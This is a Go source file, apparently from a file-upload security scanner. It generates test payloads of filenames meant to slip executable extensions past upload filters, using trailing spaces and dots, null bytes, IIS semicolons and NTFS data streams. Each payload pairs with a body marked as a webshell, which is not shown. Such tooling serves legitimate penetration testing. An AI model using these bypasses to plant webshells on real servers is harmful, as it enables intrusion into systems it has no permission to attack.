package payload

// moduleC generates Filename Obfuscation and Sanitization Fault test payloads.
func moduleC() []*Payload {
	var tests []*Payload

	// C1: Trailing space variations
	trailingSpaceTests := []struct {
		filename  string
		technique string
	}{
		{"test.php ", "Trailing space after extension"},
		{"test.php  ", "Double trailing space after extension"},
		{"test.asp ", "Trailing space after .asp"},
		{"test.aspx ", "Trailing space after .aspx"},
		{"test.jsp ", "Trailing space after .jsp"},
		{"test.cgi ", "Trailing space after .cgi"},
	}

	for _, t := range trailingSpaceTests {
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: t.technique,
			Filename:  t.filename,
			Extension: extractExtension(t.filename),
			Body:      getPayloadForExtension(extractExtension(t.filename)), // ✅ WEBSHELL
			Tags:      []string{"trailing-space", "sanitization"},
		})
	}

	// C2: Trailing dot variations
	trailingDotTests := []struct {
		filename  string
		technique string
	}{
		{"test.php.", "Trailing dot after extension"},
		{"test.php..", "Double trailing dot"},
		{"test.php...", "Triple trailing dot"},
		{"test.asp.", "Trailing dot after .asp"},
		{"test.aspx.", "Trailing dot after .aspx"},
		{"test.jsp.", "Trailing dot after .jsp"},
		{"test.php . ", "Combined trailing space, dot, space"},
	}

	for _, t := range trailingDotTests {
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: t.technique,
			Filename:  t.filename,
			Extension: extractExtension(t.filename),
			Body:      getPayloadForExtension(extractExtension(t.filename)), // ✅ WEBSHELL
			Tags:      []string{"trailing-dot", "sanitization"},
		})
	}

	// C3: Null byte injection
	nullByteTests := []struct {
		filename  string
		technique string
	}{
		{"test.php%00.jpg", "URL-encoded null byte (php%00.jpg)"},
		{"test.php%00.png", "URL-encoded null byte (php%00.png)"},
		{"test.php%00.gif", "URL-encoded null byte (php%00.gif)"},
		{"test.php\x00.jpg", "Raw null byte (php\\x00.jpg)"},
		{"test.php\x00.png", "Raw null byte (php\\x00.png)"},
		{"test.asp%00.jpg", "URL-encoded null byte (asp%00.jpg)"},
		{"test.aspx%00.jpg", "URL-encoded null byte (aspx%00.jpg)"},
		{"test.php%00%00.jpg", "Double null byte"},
	}

	for _, t := range nullByteTests {
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: t.technique,
			Filename:  t.filename,
			Extension: extractExtension(t.filename),
			Body:      getPayloadForExtension(extractExtension(t.filename)), // ✅ WEBSHELL
			Tags:      []string{"null-byte", "path-truncation", "sanitization"},
		})
	}

	// C4: Special characters and NTFS-specific
	specialTests := []struct {
		filename  string
		technique string
	}{
		{"test.php;.jpg", "Semicolon separator - IIS/ASP.NET"},
		{"test.asp;.jpg", "Semicolon separator (asp;.jpg)"},
		{"test.aspx;.jpg", "Semicolon separator (aspx;.jpg)"},
		{"test.php::$DATA", "NTFS Alternate Data Stream"},
		{"test.asp::$DATA", "NTFS ADS (asp::$DATA)"},
		{"test.php%3b.jpg", "URL-encoded semicolon"},
		{"test.php#.jpg", "Fragment separator in filename"},
		{"test.php?.jpg", "Query separator in filename"},
	}

	for _, t := range specialTests {
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: t.technique,
			Filename:  t.filename,
			Extension: extractExtension(t.filename),
			Body:      getPayloadForExtension(extractExtension(t.filename)), // ✅ WEBSHELL
			Tags:      []string{"special-chars", "ntfs", "sanitization"},
		})
	}

	return tests
}
